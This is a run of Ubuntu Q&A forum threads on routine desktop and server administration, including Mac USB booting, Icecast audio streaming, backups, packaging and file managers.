want to use your USB stick with an Apple Mac, you will need to restart or power-on the Mac with the USB stick inserted while the Option/alt ⌥ key is pressed.\nThis will launch Apple's 'Startup Manager' which shows bootable devices connected to the machine. Your USB stick should appear as gold/yellow and labelled 'EFI Boot'. Selecting this will lead you to the standard Ubuntu boot menu.\n\nSource: Create a bootable USB stick on macOS\n\nA: This is a FAQ in the Ubuntu Forum: http://ubuntuforums.org/showthread.php?t=1046568\nIt does not work directly, but requires some special handling with GRUB http://ubuntuforums.org/showthread.php?t=995704 \nAdded: The information on the Download page shows how to build a USB key that is bootable on PCs, but not on Macs.\n\nA: I have the following old iMac:\nLate 2009 iMac 27\" Intel Core i7 2.8ghz\nmodel identifier: 11,1\nmodel: A1312 (EMC 2374)\nOrder: MC507LL/A\nOS: macOS High Sierra (last MacOS version supported by this model)\nGPU: AMD Radeon 4850\nMy superdrive is dead so bootable CD/DVD is not possible.\nNone of the methods described above worked for my Mac:\n\n*\n\n*The Ubuntu instructions (as mentioned above in other posts) say to use Etcher to flash the USB drive - my mac will NOT boot off a ISO flashed USB.\n\n*UNetbootin also seems to flash an ISO which isn't bootable.\n\nWhat did work:\n\n*\n\n*Boot into MacOS > Open Disk Utility.app > I added a second partition to my main internal drive, Erase/format this partition as MS DOS (FAT) with a GUID partition table\n\n*Insert your USB drive and also Erase/format it as MS DOS (FAT) with GUID partition.\n\n*Download Ubuntu Desktop (NOT Ubuntu Server - everytime I booted off the USB loaded with ubuntu server the screen flickered and went black because I think it can't load the GPU driver for the Radeon 4850). There does appear to be a workaround though.\n\n*Follow these instructions to flash the USB the proper way for MacOS boot screen (basically convert the ISO into a DMG)\n\n*Follow these instructions to install the rEFInd as your boot loader.\n\n*Reboot the machine with flashed USB plugged in\n\n*Pick the EFI boot device\n\n*It will load the installation program but be quick and make sure you hit up/down arrow to cancel the auto run timer. I had to pick the \"Installation (Safe Graphics)\" option in order for the installer to load up (again because the \"normal\" installer is throwing an error about the Radeon 4850 GPU).\n\n*proceed thru the install as normal however when you get to the \"Installation Type\" where you choose the partition, make sure to set \"device for boot loader installation\" drop down to the disk partition, not the root of the disk (for example /dev/sda2 not /dev/sda since this would overwrite rEFInd boot loader with GRUB boot loader).\n\nLifeWire has a good tutorial albeit I don't think all the steps are necessary so above is a shortened approach as of July 2021.\n\nA: Try to get a machine with Ubuntu already installed, a PC, notebook, whatever, maybe from a friend, and then get an ISO image of Ubuntu 12.10 amd64.

Broadcasting the output of the soundcard as an internet radio stream is a reliable way to stream audio in a network. This can nicely be used to e.g. transmit audio in a wireless LAN to another computer or any other device capable of playing internet radio streams.\nHowever I did not find an easy step by step guide on how to set this up.\n\nA: Broadcast audio with Icecast2\n\n1. Install Icecast2 \n\n2. Edit Icecast2 configuration\nOpen the file /etc/icecast2/icecast.xml as root in an editor. For security reasons you should setup passwords in the <authentication> section:\n<admin-user>admin</admin-user>\n<admin-password>hackme</admin-password> \n\nIf you changed the <source-password> or <relay-password> you need to do so on the source or relay side as well. That means leave it default or change it in the ices2.xml file (see below) as well. The same will need to be done in the Ices or Darkice configuration files.\nYou also need to define the hostname where your stream can be reached:\n<hostname>localhost</hostname>\n\nLeave it as localhost (no need to give a resolved IP there) when you only want to stream in your local network. The default port to listen to is 8000. Change it only when needed.\n\n3. Edit defaults\nOpen the /etc/default/icecast2 file as root in an editor. The last line needs to be changed to \nENABLE=true\n\nThat's all for Icecast2. Of course there are many more settings you can play with. In the configurations files there are explanatory notes on parameters.\n4. Start/Stop Icecast\nThe server is started and stopped by the following commands:\n/etc/init.d/icecast2 start\n/etc/init.d/icecast2 stop\n\nWhile running the Icecast server can be administrated from any browser at http://localhost:8000/admin/ after entering your administrator credentials  defined in step 1. Further documentation is available from Icecast.org. \nStream2ip is a graphical frontend to quickly start and stop streams where a basic setup for Ices2, Ices or Darkice has already been done.\n\nIces2  for streaming OGG Vorbis audio from a local soundcard\nTo set up of pulseaudio to enable recording from the soundcard see note for Darkice below.\nMake directories for Ices2\nmkdir /var/log/ices   # in case you need logfiles.  \nmkdir /etc/ices2      # for putting ices stuff in.  \n\nEdit the Ices2 configuration .xml\nIces2 will run using an .xml file for settings. Verbous examples of configurations can be found in /usr/share/doc/ices2/examples/. These files need to be edited to meet your needs and can be copied anywhere, best in your home directory. Depending on the configuration file Ices2 uses a playlist in Ogg Vorbis format (ices-playlist.xml) or the output from your soundcard (ices-alsa.xml) as streaming source for Icecast2.\nIn the section <input> you may need to replace the device if you have setup your sound system to PulseAudio. To do this edit the corresponding line to:\n<param name=\"device\">pulse</param>\n\nThe name of the stream for the receiving client is defined in the following section.\n<mount>/example1.ogg</mount>\n\nStart Streaming\nStreams from your soundcard will be started by first running the Icecast2 server, and then running Ices2 using the following commands:\n/etc/init.d/icecast2 start\nices2 /home/user/somewhere/ices-pulse.xml # or any other name from .xml file\n\nSetup Receiver\nOn the receiver side your radio \"station\" tunes on: <serverIP>:8000/example1.ogg where <serverIP> is the IP of your streaming server followed by the port you defined in the icecast.xml file (default 8000).\nTerminate Streaming\nStreams are terminated by killing Ices2 and/or stop running the Icecast2 server:\nkillall ices2\n/etc/init.d/icecast2 stop\n\n\nIces for broadcasting mp3 playlists\nBroadcasting a playlist containing mp3 files can not be done with Ices2. We need to install IceS, which we have to install from source.\nAfter having set up the configuration file with server address, password and streaming properties (well documented example will be found in /usr/share/doc/ices/examples) we can stream mp3 audio files from playlists (e.g. in .m3u format) over an Icecast2 server by:\n/etc/init.d/icecast2 start\nices -c <path_to_config_file> -F <path_to_playlist>\n\nFor further options read the documentation in the quite elaborate man page from man ices.\n\nDarkice  for live streaming\nWe can stream the output of the local sound card as OGG Vorbis or as mp3 stream using Darkice. To enable streaming of the local soundcard we may need to define the recording device for Darkice in pulseaudio first. This can be done with pavucontrol . In the Recording tab choose Monitor of <your soundcard> for the \"ALSA plug-in [darkice]\".\nThe configuration file (well documented example given in /usr/share/doc/darkice/examples) needs to be adapted to the Icecast server and the local sound environment:\n[general]\nduration        = 0      # duration in s, 0 forever\nbufferSecs      = 1      # buffer, in seconds\nreconnect       = yes    # reconnect if disconnected\n\n[input]\ndevice          = default # or `pulse' for Pulseaudio\nsampleRate      = 44100   # sample rate 11025, 22050 or 44100\nbitsPerSample   = 16      # bits\nchannel         = 2       # 2 = stereo\n\n[icecast2-0]\nbitrateMode     = vbr       # variable bit rate (`cbr' constant, `abr' average)\nquality         = 1.0       # 1.0 is best quality\nformat          = mp3       # format. Choose `vorbis' for OGG Vorbis\nbitrate         = 256       # bitrate\nserver          = localhost # or IP\nport            = 8000      # port for IceCast2 access\npassword        = hackme    # source password to the IceCast2 server\nmountPoint      = mystream.mp3  # mount point on the IceCast2 server .mp3 or .ogg\nname            = mystream\n\nAfter saving this configuration (e.g. in ~/music/darkice.cfg) we first run the Icecast server and are then able to stream pulseaudio output from the local sound card by invoking:\n/etc/init.d/icecast2 start\ndarkice -c ~/music/darkice.cfg\n\nOn the receiver we tune to http://<localhost>:8000/mystream.mp3 for listening. <localhost> is the IP of the Icecast server.\n", "Q: Does it makes sense to backup the whole partition as opposed to their files? I know that on Windows it's quite futile to try to backup the \"C:\" partition file-wise and that's why a full partition backup is needed. Is it OK to backup a the root Linux partition file-wise? Are there any downsides?\nClarification\nHere, I don't care about advantages of partial backups. I'm going to do additional separate backups of /home, etc. What I'm interested in here is the comparison of\n\n*\n\n*backup of all files from /\n\n\n*vs. backup of the whole partition as device\nWhat are the advantages of something like dd if=/dev/sda1 ...?\n\nA: The Linux filesystem is designed to be more flexible. I would actually suggest this (fragmented) as a backup strategy not only because it saves you a lot of bandwidth and storage space, but as long as you know what to do, restoring the data can often be a bit faster, assuming that you can restore to a base image and layer on your old data.\nOf course such a strategy costs time and effort through planning and implementation. There are one-click whole-system backup solutions that take all the brain work out of the problem.\nSo you do have to address this on a case by case scenario. If you can live without a full configuration (ie you're happy to reconfigure), you can forget all about packages and /etc/ and just grab /home/. You could even slice that down and only grab elements of the home dirs. Scaling up you can grab lists of what packages are installed, their configuration, their data all the way up to the entire filesystem.\nJust weigh up how confident you think you'll be if the worst happens and you need to restore the system. If you think you'll struggle trying to superimpose a partial backup, just set aside a few extra gigabytes and do full backups. If this is for a server, where regular, atomic backups are needed and bandwidth and storage is premium, you'll have to get a bit more familiar with the tools of the trade.\n\nA: The classic backup method is to use tools like tar and dump to backup the files, usually with frequent incremental backups.  As you mentioned, it was Windows that popularized image type backups as it lacked the ability to backup files that were in use.  File level backups allow you to perform incremental backups and restores.  With image backups, it is generally all or nothing.  When restoring conventional backups, you have the option to restore to a different filesystem type, and any fragmentation in the old filesystem is left behind.  Image backups put everything back exactly as it was.  After restoring a conventional backup, you need to reinstall the boot loader by hand, but with image backups, it's a one step simple process.\nIf you are going to do an image backup, you want to use smarter tools like partclone or ghost4linux rather than dd, which doesn't distinguish between used and free parts of the filesystem.  Skipping the free parts makes for a much smaller image and faster backup/restore times.  Another limitation of image backups is that they can not be restored to a smaller disk/partition than the original, even if it was mostly free space.\n", "Q: NX/SSH remote access with Remmina After many days and a lot of frustration, I managed to get freenx to work on my home server.

I have an issue with my new Toshiba laptop. Whenever I plug in an external USB device, if the laptop is not plugged in to the wall, the laptop freezes. However, nothing happens if the laptop is plugged in to the wall.\nWhen I say the laptop freezes, I mean it really freezes. The only way to recover is to hard reboot.\nMy question is, what could be causing this? Could it be the extra power drain from the sub devices that causes this (even the simplest flash drives cause a freeze)?\nPlease help me out, it's very annoying.\nThanks\nEDIT\nDoing a google search, I found that there was a BIOS update that I didnt have. After updating the BIOS, I no longer have this problem.\nLaptop model: Toshiba Portege R705-P35\nold BIOS: 1.70\nnew BIOS: 1.80\nThanks.\n\nA: One weird thing to check..... Look for your laptop model in Google to see if it usually has (no matter the OS) this problem. My desktop, for instance, freezes (although not always) when connecting USB devices because of.... some grounding problem with the MB and the front panel hub! In my case it's absolutely OS unrelated and the only workaround I've found is to \"ground\" my devices -and myself- prior to plugging them in. Nothing to lose in trying :).\n\nA: The USB port specification is 5V @ 500mA of course not all usb devices will draw this current but some might (charging mp3 players for one) If your psu is on the weak side it might just be enough to cause the computer to freeze.\n", "Q: Redirect requests to my external IP/port to a different external IP/port?

I am not aware of any plugin to do the task either. The plugin that is with Rhythmbox, might get you the covers for it. If you want to tag your songs, I recommend you use MusicBrainz Picard.

I want to buy a new PC to be used as a media server that streams HD movies, music to any wireless device on my network (laptop, desktop, TV, etc.).\n\n\n*\n\n*I was wondering about the PC hardware's specifications that I need to have so that it can work just fine? (It will be wireless)\n\n*Is there any tutorial showing how it could be done?\n\n*And the security - how can I secure it?\n\n*As well as I need it to to host my emails. I mean I have many emails. And sometimes I'm using desktop, sometimes laptop.. so is it possible to make the server store a copy of my emails, attachments, all sent items (whether they were from desktop or laptop)?\n\n\nA: As @Allan commented, this is pretty large question. Therefore, I'll give rather short answers.\nHardware\nIt depends how you are going to stream it. If you mean just sharing files, then almost anything with big enough hard disks. If you want to stream HD movies, then you'll need plenty of power.\nAs of wireless: either you'll need wireless card (PCI or USB), or if you can connect it to your wireless access point, then just cables.\nTutorials\nGoogle is your friend. For example\n\n\n*\n\n*http://www.makeuseof.com/tag/using-your-linux-computer-as-a-media-center-part-1/\n\n*http://www.makeuseof.com/tag/5-great-linux-media-cente-distributions-transform-tv/\nSecurity\nGeneral rules apply. Use secure passwords. Keep your software up-to-date. Do not allow random computers to your LAN (use WPA for wi-fi and so on). If you want it to be really more secure, you can use IPSec to encrypt connections between devices. However, most probably that's quite big overkill.\nEmails\nYou can setup for example postfix and dovecot to allow IMAP access from other computers. You can found tutorials for this for example from here. If you need specific help with setting up email server, add separate question. If you don't have really huge amount of emails (talk about hundred gigabyte or so), then common hardware can handle it easily.\n", "Q: How do I log in to a database without username and password?

Try\nmysql -u root -pROOT_PASSWORD DATABASE_NAME\n\nWhere ROOT_PASSWORD is password for mysql root account. You can also use certificates for logins.\nAs there is some confusion, at least recent versions of mysql are masking your password from process listing. You can check this by running above mentioned command and then in another terminal\nps auxw | grep mysql\n\nIf you see something like\n\nmysql -u root -px xxxxx\n\n(where -px xxxxx is exactly this, not your password), then your password is not viewable in process listing.\n\nSecurity considerations:\n\n\n*\n\n*As @Lekensteyn mentioned in comments, beware that commands you run will be saved to history file (readable only by user and root).

For instance for mechanical engineering; from what I've seen, Blender is quite flexible and powerful so maybe it serves well for this also?\n\nA: Blender is an artistic tool (read \"not intended for precision\").\n\nA: There exists project BlenderCAD, but I didn't tried it yet.\nhttp://sourceforge.net/projects/blendercad/\n\nA: It really depends what you are doing exactly.\nIn general, I would say it's not good as a CAD tool for mechanical engineering.\nIt's good for modeling good looking things (teaspot, tree, people etc.), but if you want to for example handle strength calculations, you are basically out of luck (unless you do everything manually).\nOf course, if you have to sell something, and you need good-looking renderings, then Blender might be good tool, but that's different from designing machines or buildings from engineering point of view.\n\nA: A project has been started to achieve blender be a useful as CAD tool, without losing it's current capabilities.\nhttp://www.mechanicalblender.org\nhttps://blenderartists.org/forum/showthread.php?395814-Mechanical-Blender\n\nA: Tools like Blender work differently than most engineering CAD software. Blender-like apps are focused on manipulating the textures, colors, and other attributes of surfaces. However, those apps lack the ability to easily specify specific dimensions that you need to manufacture a part, as well as the ability to generate engineering drawings a machinist needs.\n\nA: Honest answer: NO, not at all. Blender is NOT CAD, it's an artistic tool, it blends artistic ideas and visions. CAD is quite the opposite, it kills artistic ideas, it's about maths, physics and precision.\nThere are many questions and solutions about CAD on this forum, but it's up to you to establish your specific requirements and what CAD suites best for you. Bit of advice: don't ask just for CAD_period! Ask for specific equivalent (explicite names and brands) from Windows. It's more easier to find what you want that way.  \nClosest service to CAD for Blender could be architectural works renderings. Because Blender is good at render scenes.\n", "Q: How can I tell what package requires a reboot of my system? I have unattended-upgrade set up on my Ubuntu systems.   Occasionally I will log in remotely to one of them and I'll see a message informing me that I need to reboot the system (in order to complete an upgrade).   Is there a way to determine the specific package (or set of packages) which is triggering this notice?\n\nA: Short version:\ncat /var/run/reboot-required.pkgs\n\nExplanation:\nLooks like there is an easy way to automatically extract the requested information.\nInside .deb files there are control files for installation, including postinst (run after installation).\nFor example, in linux-image-2.6.35-25-generic_2.6.35-25.44_amd64.deb,\npostinst includes\nmy $notifier          = \"/usr/share/update-notifier/notify-reboot-required\";\n\nmy $warn_reboot     = 'Yes';     # Warn that we are installing a version of\n                                 # the kernel we are running\n\nand\n# Warn of a reboot\nif (-x $notifier) {\n system($notifier);\n}\n\n\nThe shell script\n/usr/share/update-notifier/notify-reboot-required updates\n/var/run/reboot-required and /var/run/reboot-required.pkgs.\nThe latter file contains a list of packages requesting a reboot.\n\nA: Based on Olli's earlier answer, I came up with a method to find all currently installed packages on your system that requires a reboot.\n~$ mkdir debs\n~$ cd debs\n~/debs$ apt-get download $(dpkg -l | tail -n +7 | awk '{print $2}')\n\nWait for the download to complete, on my system it was around 900 MB so it might take a while depending on your connection. Then:\n~/debs$ for x in $(ls); do y=$(dpkg-deb -I \"$x\" postinst 2>/dev/null | grep 'reboot-required'); if [ -n \"$y\" ]; then echo \"$x\" | grep -Poe '^.*?(?=_)'; fi; done\n\nThe output may look something like this:\ndbus\ngconf2\ninitscripts\nlibc6\nlibpam0g\nlibpam-systemd\nlibssl1.0.0\nlinux-image-3.19.0-47-generic\nlinux-image-3.19.0-49-generic\nnetwork-manager\nupstart\n\nOf course, this method is not foolproof. There might be packages that notifies about the required reboot through other means than 'notify-reboot-required', and while this shows which currently installed packages require or doesn't require a reboot, it is not certain the same will hold true for later versions of the same package.\n\nA: Reboot is recommended by the unattended-upgrades when it sees that a /var/run/reboot-required exists. The file is created by postinst (post-installation) scripts in some packages, it looks something like this:\n[ -x /usr/share/update-notifier/notify-reboot-required ] && \\\n/usr/share/update-notifier/notify-reboot-required || true\n\nIf you want to see which packages triggered this, you can have a look at the contents of the /var/run/reboot-required.pkgs file.\nFor more info also see this thread.\n\nA: I don't really know if there are other packages that require rebooting, but kernel updates always do. I'd say almost every time I've been \"asked\" to reboot, the kernel had been updated.\n", "Q: Will Gnome 2 aka \"Ubuntu Classic Desktop\" continue to be developed after 11.04? In 11.04, if you don't want to use the new Unity desktop, you can use Ubuntu Classic Desktop (selectable from the login screen), which is similar to the Gnome 2 desktop provided in 10.10. Will Ubuntu Classic Desktop continue to be improved, or is it in \"maintenance mode\"? If the latter, will it continue to exist for the foreseeable future, or is the plan to eventually discontinue it?\nThanks\n\nA: In the newest version of Ubuntu (11.10 Oneiric Ocelot), there will not be an option for \"Classic Desktop\" by default. The 'fallback' will likely be Unity 2D. Source\nGnome 2.32 is unlikely to receive additional official support. Gnome 3 (which is not the same as gnome shell) is available now, so any updates to the 2.x version will likely be small community fixes since 3.x will essentially replace it. Again, Gnome Shell is NOT necessary to run gnome 3.x, it is just a shell that runs on top of it. \n\nA: AFFAIK Gnome2 will \"stop\" development at 2.30 (actually 2.32, my mistake). I think there will still be security updates. Most of Gnome developers is working at Gnome Shell (Gnome3).\n\nA: GNOME 2.xx is officially superseded by GNOME 3.xx, but that doesn't mean the \"classic\" look is dead. In fact, the gnome-panel is still being developed, along with some applets, and everything else you know and love from GNOME 2.xx is simply improving with the rest of GNOME 3.xx.\nIn essence what I'm saying is, it will not die (is not dead) and will live on with 11.10 and others to come :), just not as part of the default install.\n", "Q: Best virtualization solution for running Windows 7 as a guest? I depend upon Ubuntu for most of my work but I still need Windows 7 for some applications such as \nOffice 2010\nCasual Gaming\nAdobe CS4 and other windows softwares that are not available on Ubuntu yet.\nI checked Wine but as of now it provides no support for Office 2010 and most of my games and softwares. So, I decided to go for Virtualizing Windows 7 inside Ubuntu, but I am confused about which virtualization software should I use on Ubuntu for virtualization.\n\nA: \"VirtualBox\" is not a generic term. It only refers to one software product, that is VirtualBox.\nAs far as virtualisation software goes, yes, it's pretty good. You can (as I do) run Adobe CS4 applications in it just fine and the performance is still fairly good too.\nWhile we're talking about virtualisation, I would perhaps suggest not installing Windows 7 as a virtualised \"guest\". You typically want the lightest possible operating system and for most modern support that's still Windows XP. If you have a license of that, you'll probably find it runs faster.\nI'm not sure I'd bother with it for MS Office. Trying to keep yourself locked to Office is usually a recipe for failure. I strongly suggest you attempt a migration to something like OpenOffice or LibreOffice or even something internet-based like Google Documents (which adds on extra collaborative features).\nGaming in a virtualised environment is a no-go. It's just not fast enough. The virtual environment doesn't have direct access to the video hardware (because Ubuntu is using it) so any acceleration is software based (there is a 3D layer provided by Wine - but it's very slow and buggy).\nIf you want something for gaming you either go with:\n\n\n*\n\n*Wine. Google for: \"appdb your-game-here\" and you'll find out how well it is supported. Performance is usually poorer than in Windows and some things just won't run well, if at all. But some games do run really quite well.\n\n*Dual Boot. You leave part of your disk dedicated to Windows so that you can still boot to it when you restart. This leaves you with the best gaming performance but it does mean you have to restart to play games and then restart again to get back to Ubuntu.\nThe important thing you should take away from this is: you don't need to pick just one route for migration. You can have VirtualBox for CS4 apps, native alternatives for Office and Dual boot or Wine for games. Each technology has its benefits and drawbacks and hopefully this will let you choose which is best for each.\n\nA: Virtualbox is probably the simplest to set up and use for this see http://www.virtualbox.org/ \nIt's also available in the Ubuntu Software Centre for easy installation\n\nA: You might also want to checkout PlayOnLiunx if your interest is also gaming. However it is not only for gaming!\nHere is the list of supported software.\n\nA: Office 2007 work on wine, 2010 should also work ...\nCs4 work, even Cs5 ...\nGaming with wine (with or without playonlinux), crossover, cedega or a dual-boot could help you play your games ...\nWine is more than decent with old games and softwares, retro gamers are happy cause many games don't work on windows xp and 7, but they could play them easily on linux ...\nNative linux games are better but some games work better on wine than on windows,\nit's more a matter of choice and time used to configurate your games on linux ...\n\nA: VM Ware is also very good.

This forum post agrees.\nIf you're lucky, you might be able to simply modify plcemu.h with this change.

Are there any good alternatives to Nautilus? I'm looking for something lightweight, with a cleaner interface, but the ability to manually enter file paths is still important. Any suggestions?\n\nA: PCMan File Manager. It is more responsive than thunar and nautilus. The interface has more real estate. \n\nA: No one has yet mentioned the excellent qtfm, which, for a lightweight filemanager has some very useful features. It is based on 'pure QT' and does not bring with it a huge amount of dependencies like other filemanagers might. It can be installed with the Ubuntu deb or compiled from source. Please see the readme for further general information about the filemanager and how to compile it.\nAs noted on the official site, it has such features as \n\n  \n*\n  \n*full theme and mime filetype icon integration  \n  \n*tree, bookmarks, list, icon, detail and thumbnail views\n  \n*customizable interface, rearrange views and toolbars to suit\n  \n*customizable key bindings for built-in and custom actions\n  \n\nImportantly, you can also configure custom actions by going to edit > custom actions and edit or add some new ones, very much in the manner of Thunar's custom actions. In the second screenshot below, the default custom actions are listed and is quite easy to follow the model and add your own actions.\nYou can set mime types by going to edit > edit filetypes, and set multiple shortcuts by going to edit > configure shortcuts, so the filemanager seems very configurable.\nThe performance is very good and you can increase that even more by running it in daemon mode with qtfm -d &.\nYou can manually enter file paths in the location bar, which you listed as an important feature for you in your question.\nAs you can see in the first screenshot, the default layout is simple and very usable, and you can have icon or list view and folders can be opened in tabs. The tabs feature may be particularly useful if you need to flick between folders quickly.\na) The main filemanager window:\n \nb) Custom actions dialogue:\n\n(You should still keep Nautilus installed, for example, as it will still be necessary for volume management and for drawing the desktop.)\n\nA: Just to add a few options, 5 easy to install alternatives (Dolphin, Thunar, GNOME Commander & Nautilus-Elementary): http://www.omgubuntu.co.uk/2010/06/daily-5-5-alternative-file-managers\nAlso Marlin: http://maketecheasier.com/using-marlin-file-manager-as-nautilus-alternative/2012/02/02\n\nA: Thunar and PCMan File Manager are already given.\nSome links with lists other file managers:\n\n\n*\n\n*common applications: file-managers\n\n*best linux file manager\n\nA: I would recommend Nemo.

The current home directory gets full.\nCan I  assign more disk space to the home directory somehow or are there any other solutions?\n\nA: I'm assuming your home directory is located on the same partition as your system. Instead of enlarging the system partition you could source the home directory out to an extra partition. That's good practice anyway. Makes it a lot easier to migrate to a new system without having to move the home directory.\nFree some space or get an extra HDD. Create a new partition and format it with a filesystem of your choice (i.e. ext4). Copy everything from your home folder to the new partition and then tell your system to mount the new partition in your home directory during startup by adding a corresponding line to /etc/fstab:\nUUID=<some UID of your new partition>  /home/username  ext4  nodev,nosuid  0  1\n\nDepending on the filesystem and mount options you might want to use this line can slightly differ.\n\nA: Making symbolic link is an excellent option in case you just need to keep the file in the required directory but dont have enough space in that directory.\n\nA: If you are running a dual boot install try using gparted (on the install disk) to shrink the windows partition and enlarge the Ubuntu partition.\nIf not try using the disk usage analyzer (Applications -> Accessories -> Disk Usage Analyzer) to possibly find large files that you don't need anymore and can delete.\nIf you can't do that perhaps purchase an additional storage device such as a USB drive or another hard disk to use for file storage.\n\nA: One solution as already proposed is to use gparted and repartition the disk.\nAnother possibility, if you have not allocated already all the disk space to active filesystems, is to take advantage of the LVM system and extend the /home partition (if you have used LVM when you created the filesystems)\nA quick-and-dirty solution can be to create a subdirectory on a filesystem that has free space and then symlink inside the home directory e.g. (supposing /data has free space, and joeuser is running out of space, /data/extend_homes will contains all the extensions for users in need of large extra diskspace)\n# mkdir -p /data/extend_homes/joeuser\n# chown joeuser:users /data/extend_homes/joeuser\n# ln -s /data/extend_homes/joeuser /home/joeuser/extraspace\n\nJoeuser should be now able to write in ~/extraspace without filling /home.\nAdmittedly, it's not a pretty solution, but it can buy you time while planning for a major reshaping/repartitioning of the system.\n\nA: Install kuser, then run it as super user (use sudo) and change the home directory to somewhere outside of /home where you have more space.\n", "Q: How do I create a PPA for a working program? Let's assume I have a working application written in C, C++ or Python. I want to create a Launchpad PPA so others can easily install it from a package. Please give step by step instructions for doing this from beginning to end. (Or provide a link that does the same ;)\n\n\n*\n\n*Does the programming language matter? (Could it be a bash script?)\n\n*Do I need to add anything to my build?\n\n*Where should the build install itself to?\n\n*How do I define dependencies?\n\n*How do I use dependencies?\n\n*How do I create a .deb?\n\n*What do I need to do before uploading to Launchpad?\n\n\nA: *\n\n*Before you can upload your package, you'll need to set it up for .deb packaging, see the Ubuntu PackagingGuide.\n\n*Once you can build a package for your software, see Launchpad's PPA documentation. It will guide you from PPA creation to uploading your package.\n\nA: That's a very wide question. I'll try to answer as much as I can, but it definitely WON'T be a step-by-step instruction. This is because there is no step-by-step algorithm for creating a package. The way you'll do it depends on many factors, mostly on the type of package (application, library), the structure of source, and many details.\nLuckily, there is a thorough guide at http://packaging.ubuntu.com\nI'll try to help you a bit with understanding the whole process, so when you'll be a bit more familiar with it. The Packaging Guide includes resources for additional help.\n\nFirst of all you should realize that creating a package (a .deb file) is a separate process from creating a PPA. Creating a PPA is a matter of going to your Launchpad's profile and clicking \"Create a new PPA\" link. That's all. It's created, it works, but it's empty. To upload a package you must first create one. But let me first answer some of your minor questions.\n\n\n*\n\n*The programing language DOES NOT matter at all. It can be a C++ application, Bash script, Brainfuck Hello World, a single README file, or a set of cool photos. Packages may contain any file. During installation the package gets extracted to the root (\"/\") of your filesystem. This way they can put some files in the binaries folder, add some wallpapers to the GNOME default set, or provide user with a Bash script.\n\n*You DO need to add something to the source. It must be a top-level directory named \"debian\". There will be some files with the package details - they will be used to define what type the package is, etc.\n\n*Dependencies are listed in one of this files (amongst other details). Where to get them from? They are simply other packages that your application uses. The developer of the application WILL know what libraries and resources his program requires, so he shouldn't have much trouble with listing them.\n\n*\n\n*Some tools used to build a package (pbuilder) can fill in the dependencies automatically, probably by determining what your app requires during compilation.\n\n\n*It is also highly recommended to use AutoTools. That's other thing you may need to add, but probably almost every piece of software uses them already. AutoTools is a set of extremely helpful programs - automake, autoconf and autoscan to name a few. When you compile&install a program with the famous ./configure && make && make install then the autotools are used to automatically deal with the source, to prepare other resources included with the source to installation, and to extract the result of the compilation to appropriate place (to answer your question: The build will extract to MANY separate places. The binaries will go to /usr/local/bin, the docs to /usr/local/share/docs etc. Moreover, a binaries from a package will go to even different places, f.e. the binaries to /usr/bin. How to deal with this complicated directories layout? Use AutoTools - it will care about it automatically, and that's why they are so useful).\n\n\nBuilding a .deb package may look as a really complicated process, but it's not that difficult. I highly recommend you the official Ubuntu guide to creating packages: http://packaging.ubuntu.com\nIt's HUGE, but you'll see you can probably skip most parts of that text (depending on what package you are going to build). Basically, packaging process consists of these parts (all are clearly explained in The Guide):\n\n\n*\n\n*Init some tools used to build packages.\n\n*Get the source\n\n*Create the ./debian directory and fill it with required data\n\n*Build the package with debuild [That should create a set of files, including *.dsc, *_source.build, *_source.changes, which are responsible for the data about the package, and how to deal with it (you will also have a source .tar.gz)]\n\n*Test whether everything works by running pbuilder locally (it will take all these files mentioned above and try to combine them into a .deb package, by automatically building the source with the help of AutoTools - that's why they are crucial for packaging [frankly speaking - not - you can get along without them or with some alternatives, but that's the very easiest approach, and other may require some advanced setup, as you'll need to instruct the builder how to build the source (using ./debian/rules file) - but that's not for beginners]) - if you just want to get a .deb package, it's done.\n\n\nNow you'll have to upload it to your PPA, which is explained on this help page: https://help.launchpad.net/Packaging/PPA/Uploading\n\n\n*\n\n*Use dput to upload these files to Launchpad\n\n*Launchpad will run pbuilder on their computers, and generate packages in a clean environment\n\n*Finally, the packages should appear in the PPA.\n\n\nAs you see creating a PPA is not that straightforward. But don't be frightened, it's also not that difficult. Moreover, I recommend you not to encourage developers to use a PPA, as probably they won't listen to you, since they would need to do some additional job (and if they wanted to they would have done it already), but you may want to try to support Ubuntu developers and the whole community and provide them with packages you've prepared :)\nI wish you good luck with creating packages, hope you'll find my answer helpful :)\nYour friend,\nRafał Cieślak\n", "Q: GTK applications do not start I have a fresh install of Ubuntu 10.04 Server on nodes of a computational cluster, and I access the nodes via ssh. I configured a X server, which I start with the command startx -- -ac. The server is running fine on port :0. Then, I set the environment variable DISPLAY to :0. Now, when I run a GTK application on the node, it fails with the following error: \nError: Unable to initialize gtk, is DISPLAY set properly?\n\nNow, my question is, is there any runtime library that I need for running GTK applications on top of a X server? I'm probably missing something obvious here, but I can't tell what :P\n\nA: I found the solution by myself after searching for a while.

I use cron-apt to download packages and send email that tells what can be updated.\nIf you are running anything critical (not your own desktop computer, that is), automatically installing updates is risky.\n\n\n*\n\n*Something breaks (for example some software removes some configuration parameter you were using, and it's not starting anymore; that's why something important was down for several hours / you were paged in the middle of night).\n\n*Your server do not boot after it upgraded something.

When installing applications via the software center or by a DEB file they will usually be installed system wide for all users.\nIs there a way to install an application for a single user only?\n\nA: I don't know too much about this subject, but it seems from the other answers that you may be able to install a package to another directory instead of / with dpkg, using the --root parameter, and then do a chroot to the dir which the package was \"installed\" in (which can of course be a dir in the home directory of the user).\nTo install a package for a user other than root, it might be possible to use the above process with fakechroot instead of chroot.\nDisclaimer: I did not try this, and do not have much experience at the time of writing with dpkg or chroot, but from what I do know about these tools, this process just might work.\nLinks which have information which may be useful for people who want to achieve the effect of chroot without root capabilities:\n\n\n*\n\n*This page about read-only bind mounts (it seems that this can be useful even to people doing a \"standard\" chroot\n\n*This page on serverfault.com\n\n*These pages about Linux Containers\n\n*The man page for fakechroot)\n\n\nUpdate\nI now have done a little bit with things which touch on this subject, and found out some more...\nFragments (local environment building blocks):\n\n\n*\n\n*Fakechroot - emulates chroot(1)\n\n*Debootstrap - Create another Debian file system hierarchy inside a directory\n\n*Fakeroot-NG/fakeroot  - Can pretend to be root for some things\n\n*EmDebian - A debian variant which uses less space and is often used in chroot environments\n\n*binfmt_misc - Can run files, using their interpreters, as if they are native binaries; useful together with qemu-user for working with binaries (or in a (fake)chroot) of foreign architectures (scripts/qemu-binfmt-conf.sh which comes with the QEMU source code automates this)\n\n*Qemu user space - Can run binaries of other architectures; can be used with some of these tools when they do not support some processor architectures\n\n*LwIP - A TCP/IP networking stack which can be run from user space\n\n\nFull (complete local environment providers):\n\n\n*\n\n*User mode linux - runs another linux system as a regular process/program\n\n*Qemu - Run a complete virtual computer\n\n*PRoot - Provides functionalities of chroot(1), mount --bind, binfmt_misc, and running binaries from other architectures using 